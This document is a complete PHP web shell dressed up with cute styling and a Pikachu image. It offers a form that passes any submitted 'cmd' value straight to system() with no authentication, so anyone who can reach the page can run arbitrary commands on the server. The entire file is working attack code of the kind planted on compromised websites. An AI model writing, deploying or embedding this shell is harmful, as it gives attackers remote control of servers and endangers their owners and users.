<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cute Web Shell</title>
    <style>
        body {
            background-color: #fffbe7;
            font-family: 'Arial', sans-serif;
            display: flex;
            align-items: flex-start;
            padding: 20px;
        }
        .image-container {
            margin-right: 30px;
        }
        img {
            width: 200px;
            border-radius: 12px;
            box-shadow: 2px 2px 8px rgba(0,0,0,0.2);
        }
        .shell-container {
            flex-grow: 1;
        }
        textarea, input[type="submit"] {
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-family: monospace;
            font-size: 14px;
        }
        pre {
            background-color: #f3f3f3;
            padding: 10px;
            border-radius: 5px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="l8bl.png" alt="Hard-working Pikachu">
    </div>
    <div class="shell-container">
        <form method="POST">
            <label for="cmd">Enter Command:</label><br>
            <textarea name="cmd" rows="4" placeholder="e.g., ls -al or PHP code"></textarea><br>
            <input type="submit" value="Execute">
        </form>
        <pre>
<?php
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "[Command Output]\n";
    // Danger: Evaluation method
     // Execute system command
        system($cmd);
}
?>
        </pre>
    </div>
</body>
</html>
